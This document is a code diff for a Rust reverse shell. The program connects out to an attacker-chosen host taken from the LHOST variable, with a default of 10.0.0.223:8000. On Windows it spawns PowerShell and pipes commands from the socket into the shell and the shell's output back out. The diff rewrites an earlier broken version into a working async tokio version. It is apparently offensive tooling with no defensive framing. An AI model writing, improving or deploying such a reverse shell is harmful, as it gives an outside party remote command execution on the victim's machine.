@@ -1,28 +1,51 @@
-use std::{
-    net::TcpStream,
-    process::{Command, Stdio},
-};
+#[cfg(unix)]
+use std::process::Stdio;
+
+use tokio::net::TcpStream;
 
 #[cfg(windows)]
-fn establish_stream() {
-    let child = Command::new("powershell")
+async fn establish_stream(mut stream: TcpStream) -> Result<(), Box<dyn std::error::Error>> {
+    use std::process::Stdio;
+    use tokio::{
+        io::{AsyncReadExt, AsyncWriteExt},
+        process::Command,
+    };
+
+    let mut child = Command::new("powershell")
+        .arg("-c")
         .stdin(Stdio::piped())
         .stdout(Stdio::piped())
-        .stderr(Stdio::piped())
         .spawn()
         .unwrap();
 
-    let mut buf = vec![];
-    s.read(&mut buf);
-    match process.stdin.unwrap().write_all(&buf) {
-        Err(why) => panic!("couldn't write to shell stdin: {}", why.description()),
-        Ok(_) => println!("send command to shell"),
+    let mut stdin = child.stdin.take().unwrap();
+    let mut stdout = child.stdout.take().unwrap();
+
+    loop {
+        let mut read_buf = vec![0; 4096];
+        let mut write_buf = vec![0; 4096];
+
+        let (read_len, write_len) = tokio::select! {
+            read_len = stream.read(&mut read_buf) => {
+                let read_len = read_len?;
+                (read_len, 0)
+            },
+            write_len = stdout.read(&mut write_buf) => {
+                let write_len = write_len?;
+                (0, write_len)
+            }
+        };
+
+        if read_len > 0 {
+            stdin.write_all(&read_buf[..read_len]).await?;
+        }
+
+        if write_len > 0 {
+            stream.write_all(&write_buf[..write_len]).await?;
+        }
     }
 
-    match process.stdout.unwrap().read_to_end(&mut buf) {
-        Err(why) => panic!("couldn't read shell stdout: {}", why.description()),
-        Ok(_) => s.write_all(&buf).unwrap(),
-    }
+    Ok(())
 }
 
 #[cfg(unix)]
@@ -40,10 +63,11 @@ fn establish_stream(stream: TcpStream) {
         .unwrap();
 }
 
-fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let home = option_env!("LHOST").unwrap_or("localhost:8000");
-    let s = TcpStream::connect(home).unwrap();
+#[tokio::main]
+async fn main() -> Result<(), Box<dyn std::error::Error>> {
+    let home = option_env!("LHOST").unwrap_or("10.0.0.223:8000");
 
-    establish_stream(s);
-    Ok(())
+    let s = TcpStream::connect(home).await.unwrap();
+
+    establish_stream(s).await
 }
